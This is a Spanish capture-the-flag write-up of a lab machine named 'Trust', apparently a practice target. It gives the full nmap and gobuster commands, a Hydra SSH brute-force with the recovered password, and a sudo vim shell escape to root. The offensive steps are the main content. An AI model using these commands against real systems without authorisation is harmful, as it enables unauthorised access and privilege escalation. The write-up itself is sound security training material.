# 🧠 Maquina Trust – Writeup

## 🛰️ Enumeración inicial

### 1️⃣ Comprobación de conectividad y sistema operativo

Se realizó un **ping** para verificar que la máquina estuviera activa. A partir del valor del **TTL = 64**, se pudo inferir que el sistema operativo es **Linux**.

---

## 🔍 Escaneo de puertos y servicios

### 2️⃣ Enumeración con Nmap

Se inició el escaneo de puertos y servicios utilizando **nmap** con la siguiente instrucción:

```bash
sudo nmap -sS -sV -O -v 127.18.0.2
```

**Resultados obtenidos:**

* **22/tcp** → SSH
* **80/tcp** → HTTP

En el puerto **80** únicamente se visualiza la página por defecto de **Apache2**.

---

## 🌐 Enumeración web

### 3️⃣ Descubrimiento de rutas con Gobuster

Se procedió a buscar rutas ocultas mediante **gobuster**:

```bash
gobuster dir -u http://127.18.0.2 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html,bak,old,zip,tar,gz -t 50
```

**Rutas encontradas:**

* `index.html`
* `secret.php`

Al acceder a `secret.php`, se muestra el siguiente mensaje:

> *"Hola Mario, esta página no se puede hackear."*

De este mensaje se deduce que **`mario`** es un posible **usuario válido** del sistema.

---

## 🔐 Acceso inicial

### 4️⃣ Ataque de fuerza bruta a SSH con Hydra

Utilizando el usuario identificado, se lanzó un ataque de fuerza bruta contra el servicio SSH:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 4
```

**Credenciales obtenidas:**

* **Usuario:** mario
* **Contraseña:** `chocolate`

Con estas credenciales se logra acceso al sistema como el usuario **mario**.

---

## ⬆️ Escalada de privilegios

### 5️⃣ Enumeración de permisos sudo

Se listan los comandos permitidos mediante **sudo**:

```bash
sudo -l
```

**Resultado:**

```text
(ALL) /usr/bin/vim
```

Esto indica que el usuario puede ejecutar **vim** con privilegios de **root**.

### 6️⃣ Obtención de shell como root

Aprovechando los permisos sobre **vim**, se obtiene una shell con privilegios elevados:

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

Verificación:

```bash
whoami
```

**Salida:**

```text
root
```

---

## ✅ Conclusión

Se logró la toma completa del sistema mediante:

1. Enumeración básica de red
2. Descubrimiento de usuario a través de contenido web
3. Fuerza bruta sobre SSH
4. Escalada de privilegios abusando de **vim con permisos sudo**

🚩 *Máquina comprometida con éxito.*
